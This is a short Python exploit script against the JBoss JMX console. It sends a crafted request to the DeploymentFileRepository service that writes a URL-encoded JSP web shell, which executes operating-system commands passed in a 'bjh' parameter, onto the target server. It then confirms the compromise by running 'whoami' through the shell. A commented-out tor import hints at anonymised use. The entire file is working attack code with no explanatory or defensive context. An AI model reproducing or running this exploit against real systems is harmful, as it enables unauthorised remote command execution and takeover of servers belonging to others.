#from lib.tor import *
import socket
import requests

def exp(target):
    url = target
    target = target.split(":")
    target = (target[0], int(target[1]))
    exp = "HEAD /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=demo.war&argType=java.lang.String&arg1=404&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3c%25%40%20%70%61%67%65%20%69%6d%70%6f%72%74%3d%22%6a%61%76%61%2e%75%74%69%6c%2e%2a%2c%6a%61%76%61%2e%69%6f%2e%2a%22%25%3e%3c%25%20%69%66%20%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%62%6a%68%22%29%20%21%3d%20%6e%75%6c%6c%29%20%7b%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%22%43%6f%6d%6d%61%6e%64%3a%20%22%20%2b%20%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%62%6a%68%22%29%20%2b%20%22%3c%42%52%3e%22%29%3b%20%50%72%6f%63%65%73%73%20%70%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%62%6a%68%22%29%29%3b%20%4f%75%74%70%75%74%53%74%72%65%61%6d%20%6f%73%20%3d%20%70%2e%67%65%74%4f%75%74%70%75%74%53%74%72%65%61%6d%28%29%3b%20%49%6e%70%75%74%53%74%72%65%61%6d%20%69%6e%20%3d%20%70%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%3b%20%44%61%74%61%49%6e%70%75%74%53%74%72%65%61%6d%20%64%69%73%20%3d%20%6e%65%77%20%44%61%74%61%49%6e%70%75%74%53%74%72%65%61%6d%28%69%6e%29%3b%20%53%74%72%69%6e%67%20%64%69%73%72%20%3d%20%64%69%73%2e%72%65%61%64%4c%69%6e%65%28%29%3b%20%77%68%69%6c%65%20%28%20%64%69%73%72%20%21%3d%20%6e%75%6c%6c%20%29%20%7b%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%64%69%73%72%29%3b%20%64%69%73%72%20%3d%20%64%69%73%2e%72%65%61%64%4c%69%6e%65%28%29%3b%20%7d%20%7d%20%25%3e%20&argType=boolean&arg4=True HTTP/1.0\r\n\r\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target))
    s.send(exp.encode(encoding="utf-8"))
    s.close

    r = requests.get("http://" + url + "/demo/404.jsp?bjh=whoami", timeout=3)
    if r.status_code == 200:
        if "Command:" in r.text:
            return "http://" + url + "/demo/404.jsp   ==============> OK"
    return False

